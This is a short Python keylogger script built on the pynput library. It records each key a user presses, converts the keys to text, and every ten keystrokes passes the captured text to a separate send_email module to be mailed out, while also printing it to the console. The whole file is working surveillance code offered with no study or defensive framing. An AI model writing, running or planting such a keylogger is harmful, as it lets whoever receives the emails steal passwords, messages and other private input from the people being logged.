import pynput
from pynput.keyboard import Key, Listener
import send_email

count = 0
keys = []
 
def on_press(key):
    global keys, count
    keys.append(str(key))
    count += 1

    if count >= 10:
        count = 0
        email(keys)
        keys.clear()  # Clear logged keys after sending

def email(keys):
    message = ""
    for key in keys:
        k = key.replace("'", "")
        if key == "Key.space":
            k = " "
        elif key == "Key.enter":
            k = "\n"
        elif "Key" in key:
            k = ""
        message += k
    
    print("Captured:", message)
    send_email.sendEmail(message)

def on_release(key):
    if key == Key.esc:
        return False  # Stop listener

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
